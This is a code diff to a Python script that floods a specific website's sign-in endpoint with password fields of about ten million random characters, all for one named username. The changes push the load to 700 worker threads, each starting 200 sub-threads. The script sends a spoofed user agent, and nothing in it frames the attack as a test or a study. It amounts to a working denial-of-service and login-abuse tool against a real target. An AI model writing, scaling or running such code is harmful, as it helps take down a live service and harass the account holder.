@@ -7,11 +7,11 @@ def generate_big_message(length):
     chars = "abcdefghijklmnopqrstuvwxyz123456789+>-*#!()"
     return ''.join(random.choice(chars) for _ in range(length))
 
-def send_requests(username, message_length=999999):
+def send_requests(username):
     url = "https://middle-star.com/includes/ajax/core/signin.php"
     payload = {
         'username_email': username,
-        'password': generate_big_message(message_length)
+        'password': generate_big_message(9999999)
     }
     headers = {
         'User-Agent': "Sngine",
@@ -40,7 +40,7 @@ def sub_worker(username):
 
 def worker_thread(username):
     sub_threads = []
-    for _ in range(10):
+    for _ in range(200):
         t = threading.Thread(target=sub_worker, args=(username,))
         t.start()
         sub_threads.append(t)
@@ -49,7 +49,7 @@ def worker_thread(username):
 
 threads = []
 username = "ahmedjooel"
-for _ in range(500):
+for _ in range(700):
     t = threading.Thread(target=worker_thread, args=(username,))
     t.start()
     threads.append(t)
